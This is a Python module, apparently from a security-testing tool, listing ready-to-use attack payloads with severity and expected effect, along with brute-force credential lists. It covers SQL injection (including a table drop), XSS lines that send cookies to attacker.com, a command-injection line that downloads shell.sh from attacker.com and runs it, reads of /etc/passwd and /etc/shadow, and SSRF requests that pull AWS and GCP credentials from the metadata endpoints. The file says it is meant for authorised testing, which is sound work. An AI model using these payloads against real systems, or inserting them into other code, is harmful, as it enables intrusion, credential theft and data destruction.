"""
CyberSentry attack payload library.
These payloads are used ONLY for testing/simulating attacks against
apps you own or have explicit permission to test.
Each payload is categorised by attack type and severity.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Literal

AttackType = Literal[
    "sqli", "xss", "cmdi", "path_traversal", "brute_force",
    "ssrf", "xxe", "open_redirect", "ssti", "lfi"
]

Severity = Literal["critical", "high", "medium", "low"]


@dataclass
class Payload:
    value: str
    attack_type: AttackType
    severity: Severity
    description: str
    owasp: str
    expected_behavior: str   # what a vulnerable app would do


# ── SQL Injection ─────────────────────────────────────────────────────────────
SQLI_PAYLOADS: list[Payload] = [
    Payload(
        value="' OR '1'='1",
        attack_type="sqli",
        severity="critical",
        description="Classic authentication bypass via tautology",
        owasp="A03:2021 - Injection",
        expected_behavior="Login succeeds without valid credentials",
    ),
    Payload(
        value="' OR 1=1--",
        attack_type="sqli",
        severity="critical",
        description="MySQL/MSSQL comment-based bypass",
        owasp="A03:2021 - Injection",
        expected_behavior="Comment strips password check, returns all rows",
    ),
    Payload(
        value="'; DROP TABLE users;--",
        attack_type="sqli",
        severity="critical",
        description="Destructive stacked query (Bobby Tables)",
        owasp="A03:2021 - Injection",
        expected_behavior="Drops users table if stacked queries are allowed",
    ),
    Payload(
        value="1 UNION SELECT username, password, 3 FROM users--",
        attack_type="sqli",
        severity="critical",
        description="UNION-based data exfiltration",
        owasp="A03:2021 - Injection",
        expected_behavior="Returns usernames and password hashes in response",
    ),
    Payload(
        value="1'; WAITFOR DELAY '0:0:5'--",
        attack_type="sqli",
        severity="high",
        description="Time-based blind SQLi (MSSQL)",
        owasp="A03:2021 - Injection",
        expected_behavior="Server response delayed by 5 seconds",
    ),
    Payload(
        value="1 AND SLEEP(5)--",
        attack_type="sqli",
        severity="high",
        description="Time-based blind SQLi (MySQL)",
        owasp="A03:2021 - Injection",
        expected_behavior="Server response delayed by 5 seconds",
    ),
    Payload(
        value="' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        attack_type="sqli",
        severity="high",
        description="Error-based schema enumeration (MSSQL)",
        owasp="A03:2021 - Injection",
        expected_behavior="Error message leaks table name",
    ),
    Payload(
        value="' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        attack_type="sqli",
        severity="high",
        description="Error-based SQLi via EXTRACTVALUE (MySQL)",
        owasp="A03:2021 - Injection",
        expected_behavior="DB version exposed in error message",
    ),
]

# ── XSS ───────────────────────────────────────────────────────────────────────
XSS_PAYLOADS: list[Payload] = [
    Payload(
        value='<script>alert("XSS")</script>',
        attack_type="xss",
        severity="high",
        description="Basic reflected XSS via script tag",
        owasp="A03:2021 - Injection",
        expected_behavior="Alert dialog rendered in browser",
    ),
    Payload(
        value='<img src=x onerror=alert(document.cookie)>',
        attack_type="xss",
        severity="critical",
        description="Cookie theft via onerror handler",
        owasp="A03:2021 - Injection",
        expected_behavior="Session cookie exposed in alert",
    ),
    Payload(
        value='<svg onload=fetch("https://attacker.com/?c="+document.cookie)>',
        attack_type="xss",
        severity="critical",
        description="SVG-based cookie exfiltration",
        owasp="A03:2021 - Injection",
        expected_behavior="Cookie silently sent to attacker server",
    ),
    Payload(
        value='javascript:alert(1)',
        attack_type="xss",
        severity="high",
        description="JavaScript URL injection",
        owasp="A03:2021 - Injection",
        expected_behavior="JS executed when link is clicked",
    ),
    Payload(
        value='"><script>document.location="https://attacker.com/"+document.cookie</script>',
        attack_type="xss",
        severity="critical",
        description="Attribute breakout + redirect exfiltration",
        owasp="A03:2021 - Injection",
        expected_behavior="Victim redirected with cookie in URL",
    ),
    Payload(
        value="<details open ontoggle=alert(1)>",
        attack_type="xss",
        severity="high",
        description="HTML5 event handler XSS",
        owasp="A03:2021 - Injection",
        expected_behavior="Alert fires on auto-open of details element",
    ),
    Payload(
        value='<iframe srcdoc="<script>parent.document.cookie</script>">',
        attack_type="xss",
        severity="high",
        description="Iframe srcdoc XSS bypass",
        owasp="A03:2021 - Injection",
        expected_behavior="Nested JS accesses parent cookie",
    ),
]

# ── Command Injection ─────────────────────────────────────────────────────────
CMDI_PAYLOADS: list[Payload] = [
    Payload(
        value="; id",
        attack_type="cmdi",
        severity="critical",
        description="Semicolon chaining — run id command",
        owasp="A03:2021 - Injection",
        expected_behavior="uid= output appended to response",
    ),
    Payload(
        value="| cat /etc/passwd",
        attack_type="cmdi",
        severity="critical",
        description="Pipe to read /etc/passwd",
        owasp="A03:2021 - Injection",
        expected_behavior="System user list returned",
    ),
    Payload(
        value="`whoami`",
        attack_type="cmdi",
        severity="critical",
        description="Backtick command substitution",
        owasp="A03:2021 - Injection",
        expected_behavior="Current user returned in response",
    ),
    Payload(
        value="$(cat /etc/shadow)",
        attack_type="cmdi",
        severity="critical",
        description="$() substitution — shadow file read",
        owasp="A03:2021 - Injection",
        expected_behavior="Hashed passwords exposed (if root)",
    ),
    Payload(
        value="; sleep 5",
        attack_type="cmdi",
        severity="high",
        description="Time-based blind command injection",
        owasp="A03:2021 - Injection",
        expected_behavior="Server response delayed by 5 seconds",
    ),
    Payload(
        value="|| wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s",
        attack_type="cmdi",
        severity="critical",
        description="Remote shell download + execute",
        owasp="A03:2021 - Injection",
        expected_behavior="Reverse shell established",
    ),
]

# ── Path Traversal ────────────────────────────────────────────────────────────
PATH_TRAVERSAL_PAYLOADS: list[Payload] = [
    Payload(
        value="../../../etc/passwd",
        attack_type="path_traversal",
        severity="critical",
        description="Classic directory traversal to /etc/passwd",
        owasp="A01:2021 - Broken Access Control",
        expected_behavior="System password file returned",
    ),
    Payload(
        value="..\\..\\..\\windows\\win.ini",
        attack_type="path_traversal",
        severity="critical",
        description="Windows-style traversal to win.ini",
        owasp="A01:2021 - Broken Access Control",
        expected_behavior="Windows ini file contents returned",
    ),
    Payload(
        value="%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        attack_type="path_traversal",
        severity="critical",
        description="URL-encoded traversal bypass",
        owasp="A01:2021 - Broken Access Control",
        expected_behavior="Password file returned via encoded path",
    ),
    Payload(
        value="....//....//etc/passwd",
        attack_type="path_traversal",
        severity="high",
        description="Double-encoded traversal filter bypass",
        owasp="A01:2021 - Broken Access Control",
        expected_behavior="Bypasses naive ../ filters",
    ),
    Payload(
        value="/proc/self/environ",
        attack_type="path_traversal",
        severity="high",
        description="Linux proc environ — leaks env vars incl. secrets",
        owasp="A01:2021 - Broken Access Control",
        expected_behavior="Environment variables including API keys exposed",
    ),
]

# ── SSRF ──────────────────────────────────────────────────────────────────────
SSRF_PAYLOADS: list[Payload] = [
    Payload(
        value="http://169.254.169.254/latest/meta-data/",
        attack_type="ssrf",
        severity="critical",
        description="AWS IMDS v1 metadata access",
        owasp="A10:2021 - Server-Side Request Forgery",
        expected_behavior="AWS instance metadata returned (incl. IAM creds)",
    ),
    Payload(
        value="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        attack_type="ssrf",
        severity="critical",
        description="AWS IAM credential theft via SSRF",
        owasp="A10:2021 - Server-Side Request Forgery",
        expected_behavior="Temporary AWS credentials exposed",
    ),
    Payload(
        value="http://metadata.google.internal/computeMetadata/v1/",
        attack_type="ssrf",
        severity="critical",
        description="GCP metadata API access",
        owasp="A10:2021 - Server-Side Request Forgery",
        expected_behavior="GCP instance metadata returned",
    ),
    Payload(
        value="http://localhost:6379/",
        attack_type="ssrf",
        severity="high",
        description="Internal Redis access via SSRF",
        owasp="A10:2021 - Server-Side Request Forgery",
        expected_behavior="Redis responds or caches data retrieved",
    ),
    Payload(
        value="file:///etc/passwd",
        attack_type="ssrf",
        severity="critical",
        description="Local file read via file:// SSRF",
        owasp="A10:2021 - Server-Side Request Forgery",
        expected_behavior="Server reads local file and returns content",
    ),
]

# ── SSTI ──────────────────────────────────────────────────────────────────────
SSTI_PAYLOADS: list[Payload] = [
    Payload(
        value="{{7*7}}",
        attack_type="ssti",
        severity="critical",
        description="Jinja2/Twig/Pebble detection probe",
        owasp="A03:2021 - Injection",
        expected_behavior="Response contains '49' — template evaluated",
    ),
    Payload(
        value="{{config.items()}}",
        attack_type="ssti",
        severity="critical",
        description="Flask config dump via SSTI",
        owasp="A03:2021 - Injection",
        expected_behavior="Flask app config including SECRET_KEY exposed",
    ),
    Payload(
        value="{{''.__class__.__mro__[1].__subclasses__()}}",
        attack_type="ssti",
        severity="critical",
        description="Python class traversal via SSTI",
        owasp="A03:2021 - Injection",
        expected_behavior="List of Python subclasses returned — RCE possible",
    ),
    Payload(
        value="${7*7}",
        attack_type="ssti",
        severity="high",
        description="Freemarker/Spring template probe",
        owasp="A03:2021 - Injection",
        expected_behavior="Response contains '49'",
    ),
]


# ── Brute force (credential stuffing patterns) ────────────────────────────────
BRUTE_FORCE_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest",
    "superuser", "sysadmin", "webmaster", "api", "service",
]

BRUTE_FORCE_PASSWORDS = [
    "password", "password123", "123456", "admin", "admin123",
    "letmein", "welcome", "monkey", "qwerty", "abc123",
    "Password1!", "P@ssw0rd", "changeme", "secret", "pass",
]


# ── Aggregated index ─────────────────────────────────────────────────────────
ALL_PAYLOADS: dict[str, list[Payload]] = {
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "cmdi": CMDI_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
    "ssti": SSTI_PAYLOADS,
}


def get_payloads(attack_type: str | None = None) -> list[Payload]:
    """Return payloads for a given attack type, or all payloads."""
    if attack_type is None:
        return [p for payloads in ALL_PAYLOADS.values() for p in payloads]
    return ALL_PAYLOADS.get(attack_type.lower(), [])